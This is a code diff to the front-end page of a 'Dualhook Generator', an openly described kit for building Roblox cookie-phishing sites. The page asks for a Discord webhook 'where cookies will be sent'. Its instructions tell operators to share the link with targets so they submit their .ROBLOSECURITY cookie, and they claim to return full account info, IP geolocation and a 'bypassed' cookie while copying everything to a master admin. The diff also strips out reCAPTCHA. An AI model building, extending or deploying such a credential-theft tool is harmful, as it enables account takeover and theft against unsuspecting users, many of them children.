@@ -14,7 +14,6 @@ $globalStats = getGlobalStats();
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     
     <style>
         :root {
@@ -80,10 +79,10 @@ $globalStats = getGlobalStats();
             margin: 0 auto 20px;
         }
 
-        input:focus, textarea:focus {
-            outline: none;
-            border-color: #3b82f6 !important;
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2) !important;
+        .info-text {
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.5);
+            margin-top: 0.5rem;
         }
 
         .btn-generate {
@@ -93,54 +92,50 @@ $globalStats = getGlobalStats();
 
         .btn-generate:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
+            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.4);
         }
 
-        .info-text {
-            font-size: 13px;
-            color: #94a3b8;
-            margin-top: 6px;
+        .btn-generate:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
         }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center px-4 py-12">
-    <div class="max-w-lg w-full mx-auto">
+<body>
+    <div class="container mx-auto px-4 py-12 max-w-2xl">
         <!-- Header -->
-        <div class="text-center mb-8">
-            <div class="icon-box glass-effect mx-auto">
-                <span>🍪</span>
+        <div class="text-center mb-12">
+            <div class="icon-box">
+                🚀
             </div>
-            <h1 class="text-4xl md:text-5xl font-display font-bold tracking-tight mb-3 animated-gradient-text">
-                Roblox Cookie Refresher
+            <h1 class="text-4xl font-bold mb-3">
+                <span class="animated-gradient-text">Dualhook Generator</span>
             </h1>
-            <p class="text-xl text-white/80 font-semibold mb-2">
-                Dual Hook Generator
-            </p>
-            <p class="text-white/60">
-                Create your own Roblox cookie Dualhook site in seconds
-            </p>
+            <p class="text-white/70">Create your custom cookie collection site</p>
         </div>
 
-        <!-- Main Card -->
+        <!-- Form Card -->
         <div class="glass-effect rounded-3xl p-8 shadow-2xl">
-            <form id="generatorForm">
-                <!-- Site Name -->
+            <form id="generatorForm" class="space-y-6">
+                <!-- Directory Name -->
                 <div class="mb-6">
                     <label class="flex items-center gap-2 text-sm font-medium text-white/90 mb-2">
                         <svg class="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M2 6a2 2 0 012-2h12a2 2 0 012 2v8a2 2 0 01-2 2H4a2 2 0 01-2-2V6zm2 0v8h12V6H4z"/>
+                            <path fill-rule="evenodd" d="M2 6a2 2 0 012-2h4l2 2h4a2 2 0 012 2v1H8a3 3 0 00-3 3v1.5a1.5 1.5 0 01-3 0V6z" clip-rule="evenodd"/>
+                            <path d="M6 12a2 2 0 012-2h8a2 2 0 012 2v2a2 2 0 01-2 2H2h2a2 2 0 002-2v-2z"/>
                         </svg>
-                        Site Name (Directory)
+                        Site Name
                     </label>
                     <input 
                         type="text" 
                         id="directory" 
                         name="directory" 
-                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all"
-                        placeholder="e.g., myrefresher123"
-                        pattern="[a-zA-Z0-9_-]+"
+                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all focus:border-blue-400 focus:ring-2 focus:ring-blue-400/20 outline-none"
+                        placeholder="my-awesome-site"
+                        pattern="[a-zA-Z0-9_-]{3,32}"
                         minlength="3"
-                        maxlength="20"
+                        maxlength="32"
                         required
                     >
                     <p class="info-text">3-32 characters: letters, numbers, hyphens, underscores only</p>
@@ -159,16 +154,11 @@ $globalStats = getGlobalStats();
                         type="url" 
                         id="webhook" 
                         name="webhook" 
-                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all"
+                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all focus:border-blue-400 focus:ring-2 focus:ring-blue-400/20 outline-none"
                         placeholder="https://discord.com/api/webhooks/..."
                         required
                     >
                     <p class="info-text">Where cookies will be sent. Get this from Discord channel settings → Integrations → Webhooks</p>
-                </div>
-
-                <!-- reCAPTCHA -->
-                <div class="mb-6 flex justify-center">
-                    <div class="g-recaptcha" data-sitekey="6LfYourSiteKey"></div>
                 </div>
 
                 <!-- Generate Button -->
@@ -255,35 +245,34 @@ $globalStats = getGlobalStats();
                                 </div>
                                 <div>
                                     <p class="text-sm text-gray-600 mb-1">🔗 Your Link</p>
-                                    <p class="font-mono text-xs bg-gray-100 p-2 rounded break-all">${data.instanceUrl}</p>
+                                    <a href="${data.instanceUrl}" target="_blank" class="font-mono text-sm text-blue-600 bg-gray-100 p-2 rounded block hover:bg-gray-200">${data.instanceUrl}</a>
                                 </div>
                                 <div>
                                     <p class="text-sm text-gray-600 mb-1">📊 Dashboard</p>
-                                    <p class="font-mono text-xs bg-gray-100 p-2 rounded break-all">${data.dashboardUrl}</p>
+                                    <a href="${data.dashboardUrl}" target="_blank" class="font-mono text-sm text-blue-600 bg-gray-100 p-2 rounded block hover:bg-gray-200">${data.dashboardUrl}</a>
                                 </div>
                                 <div>
                                     <p class="text-sm text-gray-600 mb-1">🔑 Access Token</p>
-                                    <p class="font-mono text-xs bg-gray-100 p-2 rounded break-all">${data.token}</p>
+                                    <p class="font-mono text-sm bg-gray-100 p-2 rounded break-all">${data.token}</p>
                                 </div>
                                 <div class="bg-green-50 border border-green-200 rounded p-3 mt-4">
-                                    <p class="text-xs text-green-800">✅ Account info fetching</p>
-                                    <p class="text-xs text-green-800">✅ Robux balance display</p>
-                                    <p class="text-xs text-green-800">✅ Premium status check</p>
-                                    <p class="text-xs text-green-800">✅ Limited RAP calculation</p>
-                                    <p class="text-xs text-green-800">✅ Group ownership detection</p>
-                                    <p class="text-xs text-green-800">✅ IP geolocation</p>
-                                    <p class="text-xs text-green-800">✅ Game visit stats</p>
-                                    <p class="text-xs text-green-800">✅ Rich Discord embeds</p>
-                                    <p class="text-xs text-green-800">✅ Cookie refresh bypass</p>
-                                    <p class="text-xs text-green-800">✅ Master admin logging</p>
+                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Account Info Fetching</p>
+                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Robux Balance Display</p>
+                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Premium Status Check</p>
+                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Limited RAP Calculation</p>
+                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Group Ownership Detection</p>
+                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Game Visit Stats</p>
+                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Rich Discord Embeds</p>
+                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Cookie Refresh Bypass</p>
+                                    <p class="text-sm font-medium text-green-800">✅ Master Admin Logging</p>
                                 </div>
-                                <div class="bg-blue-50 border border-blue-200 rounded p-3">
-                                    <p class="text-xs text-blue-800 font-semibold mb-2">📋 How It Works</p>
-                                    <p class="text-xs text-blue-800">1. Share your link with targets</p>
-                                    <p class="text-xs text-blue-800">2. They submit their .ROBLOSECURITY cookie</p>
-                                    <p class="text-xs text-blue-800">3. Cookie is automatically Bypassed</p>
-                                    <p class="text-xs text-blue-800">4. You receive FULL ACCOUNT INFO + BYPASSED COOKIE</p>
-                                    <p class="text-xs text-blue-800">5. Master log sent to admin</p>
+                                <div class="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
+                                    <p class="text-sm font-medium text-blue-800 mb-2">📋 How It Works:</p>
+                                    <p class="text-xs text-blue-700">1. Share your link with targets</p>
+                                    <p class="text-xs text-blue-700">2. They submit their .ROBLOSECURITY cookie</p>
+                                    <p class="text-xs text-blue-700">3. Cookie is automatically bypassed</p>
+                                    <p class="text-xs text-blue-700">4. You receive FULL ACCOUNT INFO + BYPASSED COOKIE</p>
+                                    <p class="text-xs text-blue-700">5. Master log sent to admin</p>
                                 </div>
                             </div>
                         `,
@@ -292,21 +281,22 @@ $globalStats = getGlobalStats();
                         width: '600px'
                     });
                     
+                    // Reset form
                     document.getElementById('generatorForm').reset();
                 } else {
                     Swal.fire({
                         icon: 'error',
-                        title: 'Error',
-                        text: data.error || 'Failed to create instance',
-                        confirmButtonColor: '#3b82f6'
+                        title: 'Generation Failed',
+                        text: data.error || 'An error occurred',
+                        confirmButtonColor: '#ef4444'
                     });
                 }
             } catch (error) {
                 Swal.fire({
                     icon: 'error',
-                    title: 'Connection Error',
+                    title: 'Error',
                     text: 'Failed to connect to server',
-                    confirmButtonColor: '#3b82f6'
+                    confirmButtonColor: '#ef4444'
                 });
             } finally {
                 btn.disabled = false;
